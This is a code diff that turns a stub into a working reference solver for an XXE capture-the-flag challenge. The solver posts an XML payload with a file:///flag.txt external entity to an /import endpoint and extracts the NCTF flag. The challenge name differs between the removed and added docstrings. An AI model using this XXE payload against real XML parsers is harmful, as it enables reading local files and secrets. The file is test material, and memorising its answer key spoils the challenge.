@@ -1,14 +1,30 @@
 #!/usr/bin/env python3
-"""Reference solver for web-ledger-xxe -- STUB. TODO: implement the exploit chain and
-print the recovered flag.
+"""Reference solver for web-forum-xxe.
+
+The importer resolves external SYSTEM entities. Declare a file:// entity for
+/flag.txt and reference it.
 
     python3 solve.py http://HOST:PORT
 """
+import json
+import re
 import sys
+import urllib.request
 
 
 def solve(base):
-    raise SystemExit("solver not implemented for web-ledger-xxe")
+    base = base.rstrip("/")
+    xml = (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]>'
+        "<r>&x;</r>"
+    )
+    req = urllib.request.Request(
+        base + "/import", data=xml.encode(), headers={"Content-Type": "application/xml"}
+    )
+    parsed = json.loads(urllib.request.urlopen(req, timeout=10).read())["parsed"]
+    m = re.search(r"NCTF\{[^}]*\}", parsed)
+    return m.group(0) if m else parsed
 
 
 if __name__ == "__main__":
